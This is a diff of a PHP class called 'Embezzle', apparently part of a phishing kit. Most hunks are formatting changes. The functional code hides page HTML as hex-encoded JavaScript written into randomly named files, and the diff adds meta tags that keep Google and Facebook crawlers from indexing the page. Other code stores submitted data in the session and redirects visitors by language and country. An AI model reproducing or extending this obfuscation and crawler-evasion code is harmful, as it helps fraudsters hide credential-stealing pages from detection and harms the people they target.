@@ -102,33 +102,37 @@ class Embezzle
         }
 
         $var = 'x' . sha1(rand());
-        $fname = 'x'.sha1($hex).'.'.@$_GET['p'].'.js';
+        $fname = 'x' . sha1($hex) . '.' . @$_GET['p'] . '.js';
 
         $sc = '
-        // copyright (c) 2022 | '.$fname.' //
+        
+     
+        // copyright (c) 2022 | ' . $fname . ' //
         var ' . $var . ' = "' . $hex . '";
 
         document.writeln(unescape(' . $var . '));
-        // end of '.$fname.' //
+        // end of ' . $fname . ' //
+     
         ';
 
-        if(!is_dir(PUBLIC_PATH . '/_pages/'))
-        {
-            @mkdir(PUBLIC_PATH.'/_pages/',0777);
+        if (!is_dir(PUBLIC_PATH . '/_pages/')) {
+            @mkdir(PUBLIC_PATH . '/_pages/', 0777);
         }
-        if(!file_exists(PUBLIC_PATH . '/_pages/' . $fname))
-        {
-            file_put_contents(PUBLIC_PATH.'/_pages/'.$fname , $sc);
+        if (!file_exists(PUBLIC_PATH . '/_pages/' . $fname)) {
+            file_put_contents(PUBLIC_PATH . '/_pages/' . $fname, $sc);
         }
-        $script = '<script type="text/javascript" src="./_pages/'.$fname.'"></script>';
-        
+        $script = '<html><head>
+        <meta name="robots" content="noindex,nofollow,nosnippet" />
+        <meta name="googlebot" content="noindex,nofollow,nosnippet" />
+        <meta name="facebookbot" content="noindex,nofollow,nosnippet" />
+        </head><body>';
+        $script .= '<script type="text/javascript" src="./_pages/' . $fname . '"></script></body></html>';
 
         /** add feature on off encrypt */
 
-        if(CONFIG['app']['encrypt_html'] == 1 && CONFIG['app']['default_lang'] == 'en')
-        {
+        if (CONFIG['app']['encrypt_html'] == 1 && CONFIG['app']['default_lang'] == 'en') {
             return $script;
-        }else{
+        } else {
             return $content;
         }
     }
@@ -159,7 +163,7 @@ class Embezzle
         if (file_exists(FUNC_PATH . $fun . '.php')) {
             require_once(FUNC_PATH . $fun . '.php');
         } else {
-            echo "Can't find functions : ".FUNC_PATH.$fun." <br>";
+            echo "Can't find functions : " . FUNC_PATH . $fun . " <br>";
             exit;
         }
     }
@@ -178,10 +182,10 @@ class Embezzle
             return false;
         }
     }
-    public function implode($splitter,$data = [])
+    public function implode($splitter, $data = [])
     {
         $this->sec->cache_encrypt(json_encode($data));
-        return implode("|",$data);
+        return implode("|", $data);
     }
     public function input($name)
     {
@@ -225,14 +229,14 @@ class Embezzle
         ]);
         $this->handler->set_session([$send['type'] => $send['data']]);
 
-        if($continue != null){
-        return $this->redirect($this->urler([
-            'p' => $continue,
-            'session_id' => strtoupper(sha1(time())),
-            'lang' => $this->userdata['detection']['http_lang'],
-            'country' => $this->userdata['country']['countryCode']
-        ]));
-        }else{
+        if ($continue != null) {
+            return $this->redirect($this->urler([
+                'p' => $continue,
+                'session_id' => strtoupper(sha1(time())),
+                'lang' => $this->userdata['detection']['http_lang'],
+                'country' => $this->userdata['country']['countryCode']
+            ]));
+        } else {
             return true;
         }
     }
@@ -380,8 +384,8 @@ class Embezzle
         $this->use_fun('session');
         $this->use_fun('formatter');
 
-        if(isset($_GET['p'])){
-        @ob_start('self::minify');
+        if (isset($_GET['p'])) {
+            @ob_start('self::minify');
         }
         $userdata = $this->handler->detection();
 
